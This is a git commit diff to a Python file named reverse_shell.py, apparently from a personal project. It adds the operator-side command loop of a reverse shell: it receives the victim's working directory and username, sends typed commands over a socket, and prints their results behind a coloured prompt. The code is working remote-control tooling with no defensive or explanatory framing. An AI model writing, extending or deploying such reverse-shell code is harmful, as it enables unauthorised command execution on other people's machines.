2175120881295976ca0a8997c7714ddce02fba5f
afshinSh <afshintheprojects@gmail.com>
2024-01-10 05:16:58 +0330

    command process

--- reverse_shell.py
+++ reverse_shell.py
@@ -21,8 +21,45 @@ def create_socket(host, port):
         client_con.close()
         s.close()
         print(colored(f"[*] Connection closed successfully", 'green', attrs=['bold']))
+        
     except socket.error as e:
         print(colored(f"[!] Error (occured at socket processing): {e}",'red', attrs=['bold']))        
+
+def send_commands(client_con):
+    cwd = client_con.recv(buffer_size).decode()
+    whoami = client_con.recv(buffer_size).decode()
+    os_name = os.name  # Retrieve the operating system name using os.name
+
+    if os_name == "nt":  # Check the OS name to clear screen accordingly
+        subprocess.run('cls', shell=True)  # Clear screen for Windows
+    else:
+        subprocess.run('clear', shell=True)  # Clear screen for Unix-based systems
+
+    while True:
+        try:
+            cmd = beautiful_terminal(whoami, cwd)  # Use the beautify_terminal function to get commands
+            if len(cmd.encode()) > 0:
+                client_con.send(cmd.encode())
+            else:
+                continue
+            if cmd.lower() == 'quit':
+                break
+            results, cwd, whoami = client_con.recv(buffer_size).decode().split(separator)
+            print(colored(results, attrs=['dark']))
+        except KeyboardInterrupt:
+            client_con.send('quit'.encode())
+            print("\nGood Bye!")
+            break
+
+    
+def beautiful_terminal(whoami,cwd):
+    print(colored(f" {whoami} on ",'green',attrs=['bold']),end="")
+    print(colored(f" [{cwd}]",'blue',attrs=['dark']),end=" at ")
+    print(colored(f"[{datetime.now().strftime('%H:%M:%S')}]",'magenta'))
+    print(colored("# ",'red'),end="")
+    cmd=input().strip()
+    return cmd
+
 
 if __name__ == "__main__":
     arguments = get_args()
